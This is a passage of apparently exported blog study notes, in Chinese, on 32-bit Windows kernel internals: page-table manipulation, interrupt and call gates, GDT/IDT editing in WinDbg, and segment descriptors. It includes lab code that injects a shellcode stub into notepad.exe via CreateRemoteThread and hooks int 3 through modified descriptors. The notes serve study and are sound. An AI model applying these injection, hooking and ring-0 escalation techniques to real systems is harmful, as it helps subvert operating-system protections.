06204000 // 查看数据# 6204000 00000000 00000000 00000000 00000000# 6204010 00000000 00000000 00000000 00000000# 6204020 00000000 00000000 00000000 00000000# 6204030 00000000 00000000 00000000 00000000# 6204040 00000000 00000000 00000000 00000000# 6204050 00000000 00000000 00000000 00000000# 6204060 00000000 00000000 00000000 00000000# 6204070 00000000 00000000 00000000 00000000kd&gt; !db 06204000+0x100 // 由于页内偏移为0x100, 所以需要加上0x100# 6204100 6a 00 6a 00 6a 00 6a 00-b8 b1 ed da 75 ff d0 c3 j.j.j.j.....u...# 6204110 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204120 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204130 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204140 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204150 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204160 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 6204170 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................kd&gt; !dd 34cc7000 // 获取notepad.exe的PDE#34cc7000 09f40867 3af52867 00000000 00000000#34cc7010 26825867 22be6867 0c4c7867 30d00867#34cc7020 3d901867 00000000 26fd8867 00000000#34cc7030 00000000 00000000 00000000 00000000#34cc7040 00000000 00000000 00000000 00000000#34cc7050 00000000 00000000 00000000 00000000#34cc7060 00000000 00000000 00000000 00000000#34cc7070 00000000 00000000 00000000 00000000kd&gt; !dd 09f40000 // 获取notepad.exe的PTE# 9f40000 00000000 00000000 00000000 00000000# 9f40010 00000000 00000000 00000000 00000000# 9f40020 00000000 00000000 00000000 00000000# 9f40030 00000000 00000000 00000000 00000000# 9f40040 28f16847 00000000 00000000 00000000# 9f40050 00000000 00000000 00000000 00000000# 9f40060 00000000 00000000 00000000 00000000# 9f40070 00000000 00000000 00000000 00000000kd&gt; !ed 09f40000 06204867 // 将实验程序的PTE挂到notepad.exe的0地址上kd&gt; g 实验代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;typedef void(__stdcall * FuncProc)();int main()&#123; char * mem = (char*)VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE); FuncProc func = NULL; memset(mem, 0, 0x1000); char bufcode[] = &#123; 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0xb8, 0, 0, 0, 0, // mov eax, 0x12345678 0xff, 0xd0, // call eax 0xc3, // ret &#125;; *(int*)&amp;bufcode[9] = (ULONG)MessageBoxA; memcpy(mem+0x100, bufcode, sizeof(bufcode)); printf(&quot;%x\\r\\n&quot;, mem); system(&quot;pause&quot;); // FuncProc func = (FuncProc)mem; // func(); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4764); if (INVALID_HANDLE_VALUE == hProcess) &#123; printf(&quot;OpenProcess Failed\\r\\n&quot;); &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)0x100, NULL, NULL, NULL); if (INVALID_HANDLE_VALUE == hThread) &#123; printf(&quot;CreateRemoteThread Failed\\r\\n&quot;); &#125; WaitForSingleObject(hThread, 0); CloseHandle(hThread); CloseHandle(hProcess); system(&quot;pause&quot;); printf(&quot;%d\\r\\n&quot;, *mem); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-页表配置","slug":"Windows内核-页表配置","date":"2024-10-13T14:54:31.000Z","updated":"2024-10-14T01:21:57.880Z","comments":true,"path":"220f9f18.html","link":"","permalink":"http://example.com/220f9f18.html","excerpt":"页表配置","text":"页表配置 步骤 关闭pae选项bcdedit &#x2F;set pae ForceDisable 设置nxbcdedit &#x2F;set nx AlwaysOff","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-中断门","slug":"Windows内核-中断门","date":"2024-10-11T01:13:13.000Z","updated":"2024-10-13T14:41:28.889Z","comments":true,"path":"7297abab.html","link":"","permalink":"http://example.com/7297abab.html","excerpt":"中断门","text":"中断门 中断门知识点前期准备 int 32的计算: 80b98100 - 80b98000 &#x3D; 100（16进制） &#x2F; 8 &#x3D; 20 &#x3D;&gt; 32（10进制） 填充中断门描述符, 函数地址是: 00401080;0040ee00&#96;00081080 123456789101112131415161718192021222324252627282930313233343536373839404142kd&gt; r idtridtr=80b98000kd&gt; dq 80b98000 L30ReadVirtual: 80b98000 not properly sign extended80b98000 83e58e00`00085210 83e58e00`0008557c80b98010 00008500`00580000 83e5ee00`00085fc080b98020 83e5ee00`00086338 83e58e00`0008668880b98030 83e58e00`000869ec 83e58e00`000876f880b98040 00008500`00500000 83e58e00`00087d3c80b98050 83e58e00`00088050 83e58e00`0008838080b98060 83e58e00`000887f0 83e58e00`00088cfc80b98070 83e58e00`000899b8 83e58e00`00089e4080b98080 83e58e00`0008a154 83e58e00`0008a48880b98090 00008500`00a00000 83e58e00`0008a7e480b980a0 83e58e00`00089e40 83e58e00`00089e4080b980b0 83e58e00`00089e40 83e58e00`00089e4080b980c0 83e58e00`00089e40 83e58e00`00089e4080b980d0 83e58e00`00089e40 83e58e00`00089e4080b980e0 83e58e00`00089e40 83e58e00`00089e4080b980f0 83e58e00`00089e40 83e58e00`0008abb080b98100 00000000`00080000 00000000`00080000kd&gt; eq 80b98100 0040ee00`00081080kd&gt; dq 80b98000 L30ReadVirtual: 80b98000 not properly sign extended80b98000 83e58e00`00085210 83e58e00`0008557c80b98010 00008500`00580000 83e5ee00`00085fc080b98020 83e5ee00`00086338 83e58e00`0008668880b98030 83e58e00`000869ec 83e58e00`000876f880b98040 00008500`00500000 83e58e00`00087d3c80b98050 83e58e00`00088050 83e58e00`0008838080b98060 83e58e00`000887f0 83e58e00`00088cfc80b98070 83e58e00`000899b8 83e58e00`00089e4080b98080 83e58e00`0008a154 83e58e00`0008a48880b98090 00008500`00a00000 83e58e00`0008a7e480b980a0 83e58e00`00089e40 83e58e00`00089e4080b980b0 83e58e00`00089e40 83e58e00`00089e4080b980c0 83e58e00`00089e40 83e58e00`00089e4080b980d0 83e58e00`00089e40 83e58e00`00089e4080b980e0 83e58e00`00089e40 83e58e00`00089e4080b980f0 83e58e00`00089e40 83e58e00`0008abb080b98100 0040ee00`00081080 00000000`00080000 中断门0环堆栈压了五个值, eip, cs, eflags, esp, ss, 3环堆栈无内容;3环寄存器:EAX &#x3D; 00000000 EBX &#x3D; 7FFD5000 ECX &#x3D; BFBDF6C4 EDX &#x3D; 005F0178 ESI &#x3D; 0012FE3C EDI &#x3D; 0012FF08 EIP &#x3D; 004011A7 ESP &#x3D; 0012FE3C EBP &#x3D; 0012FF08 EFL &#x3D; 00000246CS &#x3D; 001B DS &#x3D; 0023 ES &#x3D; 0023 SS &#x3D; 0023 FS &#x3D; 003B GS &#x3D; 00000环寄存器:eax&#x3D;00000000 ebx&#x3D;7ffd5000 ecx&#x3D;bfbdf6c4 edx&#x3D;005f0178 esi&#x3D;0012fe3c edi&#x3D;0012ff08eip&#x3D;00401080 esp&#x3D;94e63c9c ebp&#x3D;0012ff08 iopl&#x3D;0 nv up di pl zr na pe nccs&#x3D;0008 ss&#x3D;0010 ds&#x3D;0023 es&#x3D;0023 fs&#x3D;0030 gs&#x3D;0000 efl&#x3D;00000046 1234567891011kd&gt; dds 94e63c9c94e63c9c 004011a9 &lt;== eip94e63ca0 0000001b &lt;== cs94e63ca4 00000246 &lt;== eflags94e63ca8 0012fe3c &lt;== esp94e63cac 00000023 &lt;== ss94e63cb0 0000000094e63cb4 0000000094e63cb8 0000000094e63cbc 0000000094e63cc0 0000027f 代码实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 10_11_InterruptGate(中断门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#pragma pack(1)typedef struct _GDTINFO&#123; short limit; ULONG table;&#125;GDTINFO;#pragma pack(0)void __declspec(naked) test()&#123; __asm &#123; int 3; iretd; &#125;&#125;int main()&#123; printf(&quot;%p\\r\\n&quot;, test); //char bufgdt[6]; //char bufidt[6]; GDTINFO gdts; GDTINFO idts; __asm &#123; /*sgdt bufgdt; sidt bufidt;*/ sgdt gdts; // 获取gdtr sidt idts; // 获取idtr &#125; system(&quot;pause&quot;); __asm &#123; push fs; int 32; pop fs; &#125; system(&quot;pause&quot;); return 0;&#125; IDT和GDT的关联12345678910111213141516171819202122kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00000000`0000000080b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000kd&gt; r idtridtr=80b98000kd&gt; dq 80b98000ReadVirtual: 80b98000 not properly sign extended80b98000 83e58e00`00085210 83e58e00`0008557c80b98010 00008500`00580000 83e5ee00`00085fc080b98020 83e5ee00`00086338 83e58e00`0008668880b98030 83e58e00`000869ec 83e58e00`000876f880b98040 00008500`00500000 83e58e00`00087d3c80b98050 83e58e00`00088050 83e58e00`0008838080b98060 83e58e00`000887f0 83e58e00`00088cfc80b98070 83e58e00`000899b8 83e58e00`00089e40 在IDT中, int3中的3代表的是索引; 83e5ee0000085fc0（int 3）中段选择子0008表示去查找GDT中00cf9b00&#96;0000ffff; IDT描述符 5.11 页码123 D位（第11位）是指默认操作数, 32位下为1, 16位下为0; 3环获取GDT和IDT的指令 获取GDT&#x2F;获取IDT: sgdt&#x2F;sidt（3环下调用）; 获取到gdt的值为ff 03 00 88 b9 80; 其中前两个字节为表的长度, 后四个字节为表的地址; 修改GDT&#x2F;修改IDT: lgdt&#x2F;lidt（0环下才能调用）; 补充 iretd中的d描述宽度用的; 16位（iret）、32位（iretd）、64位（iretq）; 作业 返回一定要用iretd吗? 使用retf; iretd 解除阻塞; retf 没有解除阻塞; sti 解除阻塞, 并且给eflags.IF &#x3D; 1; 1234567891011121314151617181920212223242526272829303132333435// InterruptGate_retf.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;windows.h&gt;// 中断门使用retf返回// 0040ee00`00081080 void __declspec(naked) test()&#123; __asm &#123; sti; // 解除阻塞, 并且使eflags.IF = 1 // int 3 retf 4; // 使用 retf 4 是为了确保在中断处理程序返回时，除了恢复 CS:EIP 外，还能从栈中弹出这个附加的 4 字节（通常是错误代码），确保栈平衡 &#125;&#125;int main()&#123; printf(&quot;%p\\r\\n&quot;, test); __asm &#123; // push 0x12345678; int 32; push 0x3b; pop fs; &#125; system(&quot;pause&quot;); return 0;&#125; 构建陷阱门自己调用; TYPE位为f, 0040ee00&#96;00081080; 中断门和陷阱门的区别1.进入中断门会清除eflag VM NT IF TF 位进入陷阱门会清除eflag VM NT TF 位2.由于中断门会清除IF位，导致一些中断触发会悬挂，陷阱门则不会 int3_hook步骤 第一步：添加一个代码段在0x48位置 第二步：计算代码段0x48的base 目标地址 - int 3偏移&#x3D; base 写回0x48位置 第三步：修改int 3中断门的段选择子为0x48 Hook函数编写 由于有缓存的存在, 可以执行一会, 那么我们在这要做二次跳转 jmp 0x48: xxx地址 当调到xxx地址后, 通过调用打印函数, 确定调用成功 jmp回int 3原本的偏移 base：401080 - 83e44fc0(int 3) &#x3D; 7C5B C0C0段描述：00cf9b00&#96;0000ffff修改gdtr 0x48位置eq 80b98848 7Ccf9b5B&#96;C0C0ffff修改int 3段选择子为48eq 80b98018 83e7ee00&#96;0048dfc083e11c60 代码实验12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 09_24_int3_hook.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//// BASE：401080 - 83e7dfc0(int 3) = 7C58 30C0// 段描述：00cf9b00`0000ffff// 修改GDTR：eq 80b98848 7Ccf9b58`30c0ffff// 修改IDTR：eq 80b98018 83e7ee00`0048dfc0#include &lt;iostream&gt;#include &lt;Windows.h&gt;typedef int(__CRTDECL *DbgPrintProc)(_In_z_ _Printf_format_string_ char const* const _Format, ...);DbgPrintProc DbgPrint = NULL;char * xxxstr = NULL;void __declspec(naked) test()&#123; __asm &#123; //push 0x8; //push haha; sub esp, 8; lea eax, haha; mov [esp], eax; mov [esp+4], 0x8; jmp fword ptr [esp]; haha: add esp, 8; push fs; mov ax, 0x30; mov fs, ax; // 业务逻辑 mov eax, [xxxstr]; push eax; call DbgPrint; add esp, 4; pop fs; // 跳回int3 mov dword ptr ss:[esp-4], 0x83e44fc0; jmp dword ptr ss:[esp-4]; &#125;&#125;int main()&#123; printf(&quot;%p\\r\\n&quot;, test); xxxstr = (char*)malloc(strlen(&quot;xxxx__main__xxxx\\r\\n&quot;) + 1); memcpy(xxxstr, &quot;xxxx__main__xxxx\\r\\n&quot;, strlen(&quot;xxxx__main__xxxx\\r\\n&quot;)); xxxstr[strlen(&quot;xxxx__main__xxxx\\r\\n&quot;)] = &#x27;\\0&#x27;; DbgPrint = (DbgPrintProc)0x83e11c60; system(&quot;pause&quot;); __asm &#123; int 3; &#125; system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-调用门提权","slug":"Windows内核-调用门提权","date":"2024-10-10T14:40:57.000Z","updated":"2024-10-11T15:47:38.553Z","comments":true,"path":"fb02f1f0.html","link":"","permalink":"http://example.com/fb02f1f0.html","excerpt":"调用门提权","text":"调用门提权 调用门知识点 当S位为0, TYPE位为C, 这个就是调用门; cs.DPL &#x3D;&#x3D; ss.DPL &#x3D;&#x3D; 调用门.DPL; 前期准备 填充调用门描述符（参数暂时为0个）; 函数地址为00401080;0040ec00&#96;00081080 修改gdtr123456789101112131415161718192021222324kd&gt; r gdtrgdtr=80b98800kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00000000`0000000080b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000kd&gt; eq 80b98848 0040ec02`00081080WriteVirtual: 80b98848 not properly sign extendedkd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 0040ec02`0008108080b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000 cs寄存器为0008, ss寄存器为0010 cs + 8 &#x3D; ss 12345600401080 cc int 3kd&gt; reax=00000000 ebx=7ffd6000 ecx=4a36ab6a edx=0052017c esi=0012fe28 edi=0012ff08eip=00401080 esp=89b49c98 ebp=0012ff08 iopl=0 nv up ei pl zr na pe nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=0000024600401080 cc int 3 返回时报错 进入0环前fs寄存器为0x3b, 进入0环后会将fs修改成0x30, 在返回时未进行修复; 代码实验123456789101112131415161718192021222324252627282930313233// 10_10_CallGate(调用门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;void __declspec(naked) test()&#123; __asm &#123; int 3; retf; &#125;&#125;int main()&#123; char bufcode[6] = &#123; 0,0,0,0,0x4b,0 &#125;; printf(&quot;%p\\r\\n&quot;, test); system(&quot;pause&quot;); __asm &#123; push fs; call fword ptr bufcode; pop fs; &#125; system(&quot;pause&quot;); return 0;&#125; 跨段不提权只压两个值（eip, cs）; 跨段提权会压四个值（eip, cs, esp, ss）; retf有参数时需要加上参数, 两个参数retf 8; 系统描述符类型当段描述符的S标志（描述符类型）为0, 则描述符为系统描述符。处理器可以识别以下类型的系统描述符: 局部描述符表（LDT）段描述符; 任务状态段（TSS）描述符; 调用门描述符; 中断门描述符; 陷阱门描述符; 任务门描述符; 这些描述符又可以分为两类: 系统段描述符和门描述符。系统段描述符指向系统段（LDT和TSS段）。门描述符它们自身就是”门”, 它们或者持有指向放置在代码段中的过程入口点的指针, 或者持有TSS（任务门）的段选择子。 系统段和门描述类型 调用门格式 4.8.3, 页码是93; 调用门为不同特权级间的进程控制转移提供了便利。它们一般只用在使用特权级保护机制的操作系统或管理程序中。调用门也可用于16位和32位代码段之间进程控制转移, 这在17.4.“混合尺寸代码段之间的控制转移”中进行描述。 调用门描述符可用在GDT或LDT中, 但是不能在中断描述符表（IDT）中。它具有六个方面的功能: 确定将要访问的代码段; 定义例程在指定代码段的入口; 指定调用例程的所应当有的特权级; 如果有栈切换, 就确定在栈之间拷贝的可选参数的个数; 定义压入目标栈的值的尺寸: 16位的门执行16位的压栈, 32位的门执行32位的压栈; 确定调用门描述符是否有效; 作业 使用jmp跨段跳转调用门; 在调用门上不支持改cs寄存器的值; jmp在调用门只能同权限跳转; 既然ret也能跳转, 那么是否可以提权; 无法修改cs寄存器的值, 无法提权, 也没有提权的悬念 既然retf也能跳转, 那么是否可以提权; 英特尔规定retf只能同权限或向低权限跳转; 补充 call是同权限或者提权跳转","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-数据段代码段的权限规则","slug":"Windows内核-数据段代码段的权限规则","date":"2024-10-08T16:52:16.000Z","updated":"2024-10-08T18:06:06.493Z","comments":true,"path":"93e9d7f1.html","link":"","permalink":"http://example.com/93e9d7f1.html","excerpt":"数据段代码段的权限规则段的权限规则 代码段、数据段、堆栈段;跨段跳转不提权 写法 jmp call;","text":"数据段代码段的权限规则段的权限规则 代码段、数据段、堆栈段;跨段跳转不提权 写法 jmp call; 裸函数知识点 关闭增量链接; 关闭随机基址; 代码实验12345678910111213141516// 裸函数 不生成多余汇编代码void __declspec(naked) test()&#123; __asm &#123; ret ;// 不加ret会导致程序报错 &#125;&#125;int main()&#123; test(); system(&quot;pause&quot;); return 0;&#125; 数据段代码段的权限规则知识点 DPL: Descriptor privilege level; CPL: Current privilege level（CS段描述符的DPL）; RPL: Request privilege level; 普通的数据段（DS、ES）下RPL可以乱给的;在堆栈段（SS）下是有用的, RPL &#x3D;&#x3D; CPL &#x3D;&#x3D; DPL才能更改;在代码段（DS）上是没用的, CPL &#x3D;&#x3D; DPL能更改, RPL系统会改回去; 代码实验12 跨段不提权跳转会将ESP和CS压到堆栈中, 所以会是ESP-8;使用retf;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-段探测","slug":"Windows内核-段探测","date":"2024-09-29T02:26:26.000Z","updated":"2024-10-11T15:37:05.770Z","comments":true,"path":"b4fed552.html","link":"","permalink":"http://example.com/b4fed552.html","excerpt":"段","text":"段 段知识点CS 代码寄存器 描述的代码SS 栈段 描述的栈 比如局部变量DS 数据段 堆地址 比如全局变量ES 扩展段 串copy movsb so edi esiFS 上下文环境段 R3: 代表TEB R0: 代表KPCR 段选择子段选择子 段选择子是一个16位的段的标识码。它并不直接指向段, 而是指向定义段的描述符。段选择子包含以下项目: Index(索引): 第3位到第15位。选择GDT或LDT中8192个描述符中的某一个。处理器将索引值乘以8（段描述符的字节数）, 然后加上GDT或LDT的基地址（分别在GDTR寄存器或者LDTR寄存器中）。 TI(table indivator) flag: 第2位。确定使用哪一个描述符表: 将这个标志置0, 则表示用GDT。将这个标志置1, 标识用LDT; Request Privilege Level(RPL 请求的特权级): 第0位和第1位。确定选择子的特权级。特权级的范围是0到3, 0为最高特权级。 段描述符 段描述符是GDT或LDT中的一个数据结构, 它为处理器提供诸如段基地址、段大小、访问权限以及状态等信息。段描述符主要是由编译器、连接器、装载器或者操作系统&#x2F;管理程序设立的, 而不是由应用程序产生的。 段描述符 段描述符中的标志和域 段界限域: 指定段的大小。处理器将两个段界限域合在一起组成一个20位的段界限值。根据G标志位（粒度）的不同设置, 处理器按两种不同的方式解释段界限 如果粒度标志位为0, 则段大小可以从1字节到1M字节, 段长增量单位为字节（以字节为单位）; 如果粒度标志位为1, 则段大小可以从4K字节到4G字节, 段长增量单位为4K字节（以页为单位 （0xFFFFF +1） * 4096(0x1000) &#x3D; （0xFFFFF +1） * 4096(0x1000) - 1）; 基地址域: 确定段的第一个字节（字节0）在4GB线性地址空间中位置。处理器将3个基地址域组合在一起构成了一个32位地址值。段基地址应当是16字节边界对齐的。16字节边界对齐不是必须的, 当这种段边界的对齐能够是程序把代码和数据对齐到16字节边界上而最大化其性能; 类型域: 指明段或门的类型, 确定段的访问权限和增长方向。如何解释这个域, 取决于该描述符是应用程序描述符（代码和数据）还是系统描述符。代码段、数据段和系统段对类型域有不同的编码 S(描述符类型)标志: 确定段描述符四系统描述符（S标记为0）或者代码、数据段描述符（S标记为1）; DPL(描述符特权级)域: 指明段的特权级。特权级从0到3, 0为最高特权。DPL用来控制对段的访问; P(段有效位)标志: 指明段当前是否在内存中（1表示在内存中, 0表示不在）。当指向段描述符的段选择子被装进段寄存器时, 如果这个标志为0, 处理器会产生段不存在异常（#NP）。内存管理软件可以通过这个标志, 来控制在某个特定时间有哪些段是真正的被载入物理内存的。这是除分页之外的另一个虚拟内存控制机制; D&#x2F;B(默认操作数大小&#x2F;默认栈指针大小和&#x2F;或上限)标志: 根据段描述符所指的是可执行代码段、向下扩展的数据段还是堆栈段, 这个标志有不同的功能。（对32位的代码和数据段, 这个标志总是被设置成1, 而16位的代码和数据段, 这个标志总是被置为0） 可执行代码段: 这个标志被称为D标志, 它指明段中指令的有效地址和操作符的默认位数。如果该标志为1, 则默认32位的地址, 32位或者8位的操作符; 若为0, 则默认16位的地址, 16位或者8位的操作符。指令前缀66H可以指定操作符的长度而不使用缺省长度。前缀67H可用来指定地址值的长度。 堆栈段（SS寄存器所指的数据段）: 这个标志位被称为B（大的）标志, 它为隐含的栈操作（如push、pop和call）确定栈指针的大小。如果该标志为1, 则使用32位的栈指针, 栈指针放在32位的ESP寄存器中; 如该标志为0, 则使用16位的栈指针, 栈指针存放在SP寄存器。 如果堆栈段为一个向下扩展的数据段, 则B标志还确定堆栈段的地址上界。 向下扩展的数据段: 这个标志称为B标志, 确定段的地址上界。如果该标志为1, 则段地址上界为FFFFFFFFH(4GB); 若该标志为0, 则段地址上界为FFFFH(64KB)。 G(粒度)标志: 确定段界限扩展的增量。当G标志为0, 则段界限以字节为单位扩展; G标志为1, 则段界限以4KB为单位扩展。（这个标志不影响段基址的粒度, 段基址的粒度永远都是字节）如果G标志为1, 那么当检测偏移是否超越段界限时, 不用测试偏移的低12位。 代码实验1.段存在权限限制12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Segments.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//// 对段的初探#include &lt;iostream&gt;#include &lt;Windows.h&gt;int val = 0x100;int main()&#123; int val2 = 0x2; // 段读写的探测 /*__asm &#123; mov ax, cs; mov ds, ax; mov eax, dword ptr [val]; mov cx, ss; mov ds, cx; mov dword ptr [val2], eax; &#125;;*/ // 对base的探测 //__asm //&#123; // mov ax, 0x4b; // mov ds, ax; // mov eax, dword ptr ds:[val]; // mov dword ptr ss:[val2], eax; // mov cx, es; // mov ds, cx; //&#125; // 对段长度的探测 __asm &#123; mov eax, fs:[0xffc]; // base + 0 mov val2, eax; &#125;; printf(&quot;%x\\r\\n&quot;, val2); system(&quot;pause&quot;); return 0;&#125; 作业 拆分GDTR 123456789101112kd&gt; dq 80b98800 L3080b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00cff300`0001ffff80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`0000000080b98880 00000000`00000000 00000000`0000000080b98890 00000000`00000000 00000000`0000000080b988a0 800089b9`ad900067 00000000`00000000 00cf9b00&#96;0000ffff Base Limit Type S DPL P AVL 0 D\\B G 00000000 fffff b 1 0 1 0 0 1 1 00cf9300&#96;0000ffff Base Limit Type S DPL P AVL 0 D\\B G 00000000 fffff 3 1 0 1 0 0 1 1 00cffb00&#96;0000ffff Base Limit Type S DPL P AVL 0 D\\B G 00000000 fffff b 1 3 1 0 0 1 1 00cff300&#96;0000ffff Base Limit Type S DPL P AVL 0 D\\B G 00000000 fffff 3 1 3 1 0 0 1 1 80008bb9&#96;8c0020ab Base Limit Type S DPL P AVL 0 D\\B G 80b98c00 000020ab b 0 0 1 0 0 0 0 804093b9&#96;b0004fff Base Limit Type S DPL P AVL 0 D\\B G 80b9b000 4fff 3 1 0 1 0 0 1 0 0040f300&#96;00000fff Base Limit Type S DPL P AVL 0 D\\B G 00000000 00fff 3 1 3 1 0 0 1 0 0000f200&#96;0400ffff Base Limit Type S DPL P AVL 0 D\\B G 00000400 ffff 2 1 3 1 0 0 0 0 00cff300&#96;0001ffff Base Limit Type S DPL P AVL 0 D\\B G 00000001 fffff 3 1 3 1 0 0 1 1 800089b9&#96;ad200067 Base Limit Type S DPL P AVL 0 D\\B G 80b9ad20 0067 9 0 0 1 0 0 0 0 800089b9&#96;acb00067 Base Limit Type S DPL P AVL 0 D\\B G 80b9acb0 0067 9 0 0 1 0 0 0 0 800092b9&#96;880003ff Base Limit Type S DPL P AVL 0 D\\B G 80b98800 03ff 2 1 0 1 0 0 0 0 800089b9&#96;ad900067 Base Limit Type S DPL P AVL 0 D\\B G 80b9ad90 0067 9 0 0 1 0 0 0 0 D&#x2F;B标志知识点D/B标志当D&#x2F;B位作用于代码段时为D位, 当作用于数据段时为B位;当描述代码段时, 默认操作数将会改变成16位的段;当描述堆栈段时, 堆栈寻址将变成16位;当描述普通数据段时, 没有任何反应; 代码实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// 描述代码段时// 1. 复制GDTR中cs段的描述符至0x48位置kd&gt; r gdtrgdtr=80b98800kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00000000`0000000080b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000kd&gt; eq 80b98848 00cffb00`0000ffffWriteVirtual: 80b98848 not properly sign extendedkd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00cffb00`0000ffff80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000// 2. 使用JMP指令进行cs段修改jmp far 0x0048:0x77D7062E// 描述堆栈段// 1. 修改0x48位置为00cff200`0000ffff（type域为2）kd&gt; eq 80b98848 00cff200`0000ffffWriteVirtual: 80b98848 not properly sign extendedkd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00cff200`0000ffff80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000// 2. 修改ss寄存器的值mov ax, 0x4b;mov ss, ax;// 3. 加载段时0x48位置type域变成3kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 